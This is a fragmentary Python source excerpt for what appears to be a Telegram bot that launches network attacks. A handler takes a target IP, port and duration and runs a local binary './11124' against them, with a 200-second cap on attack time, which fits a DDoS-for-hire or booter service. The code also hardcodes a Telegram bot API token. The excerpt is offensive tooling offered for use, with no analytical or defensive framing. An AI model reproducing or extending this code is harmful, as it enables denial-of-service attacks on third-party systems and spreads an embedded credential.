...
API_TOKEN = "7474892140:AAGt7nLn6g4yjRBjGAQUTEBPPlq-dinwXc4"
...
def attack_thread(ip, port, attack_time, attack_id):
    try:
        ...
        command = f"./11124 {ip} {port} {attack_time} 900"
...
def attack(message):
    ...
    try:
        ...
        # Validate time limit
        if attack_time > 200:
            bot.reply_to(message, "❗𝗘𝗿𝗿𝗼𝗿:𝘠𝘰𝘶 𝘊𝘢𝘯 𝘜𝘴𝘦 200 𝘚𝘦𝘤𝘰𝘯𝘥𝘴 𝘈𝘵 𝘢 𝘛𝘪𝘮𝘦")
            return
